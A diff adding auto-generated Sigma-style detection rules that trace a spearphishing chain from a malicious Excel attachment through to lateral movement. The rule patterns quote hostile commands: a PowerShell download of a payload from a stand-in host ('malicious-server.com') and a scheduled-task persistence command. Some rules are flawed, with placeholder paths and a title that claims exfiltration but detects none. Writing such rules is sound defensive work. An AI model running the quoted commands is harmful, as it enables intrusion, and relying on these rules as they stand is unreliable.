@@ -1,0 +1,112 @@
+```yaml
+- title: Identify Initial Access via Spearphishing Email
+  id: 123e4567-e89b-12d3-a456-426614174000
+  description: Monitor for email events where the subject line contains "Important Update" and the attachment is named "Update_2023.xlsx".
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      subject: "*Important Update*"
+      attachment: "Update_2023.xlsx"
+  condition: selection
+  tags:
+    - ATT&CK ID: T1566
+    - tactic: Initial Access
+  level: high
+---
+- title: Map Opening of Malicious Attachment
+  id: 123e4567-e89b-12d3-a456-426614174001
+  description: Detect the execution of Microsoft Excel with the command line indicating the opening of the file "Update_2023.xlsx".
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      Image: "C:\\Program Files\\Microsoft Office\\root\\OfficeXX\\EXCEL.EXE"
+      CommandLine: "*Update_2023.xlsx*"
+  condition: selection
+  tags:
+    - ATT&CK ID: T1203
+    - tactic: Initial Access
+  level: high
+---
+- title: Validate Macro Execution and Payload Download
+  id: 123e4567-e89b-12d3-a456-426614174002
+  description: Track PowerShell execution initiated from Excel that includes a command to download a file.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      CommandLine: "*Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe'*"
+  condition: selection
+  tags:
+    - ATT&CK ID: T1059
+    - tactic: Execution
+  level: high
+---
+- title: Monitor Execution of the Malicious Payload
+  id: 123e4567-e89b-12d3-a456-426614174003
+  description: Detect the execution of the downloaded payload which establishes a reverse shell connection.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      Image: "*malicious_payload.exe*"
+  condition: selection
+  tags:
+    - ATT&CK ID: T1203
+    - tactic: Execution
+  level: high
+---
+- title: Track Establishing Persistence
+  id: 123e4567-e89b-12d3-a456-426614174004
+  description: Monitor for the creation of a scheduled task that executes the malicious payload.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      CommandLine: "*schtasks /create /tn \"MaliciousTask\" /tr \"C:\\\\Users\\\\Victim\\\\Downloads\\\\malicious_payload.exe\"*"
+  condition: selection
+  tags:
+    - ATT&CK ID: T1053
+    - tactic: Persistence
+  level: medium
+---
+- title: Detect Lateral Movement and Data Exfiltration
+  id: 123e4567-e89b-12d3-a456-426614174005
+  description: Monitor for WMI queries executed via PowerShell that are unusual or originate from unexpected sources.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      CommandLine: "*wmic /node:\"target-machine\" product get name,version*"
+  condition: selection
+  tags:
+    - ATT&CK ID: T1021
+    - tactic: Lateral Movement
+  level: medium
+```
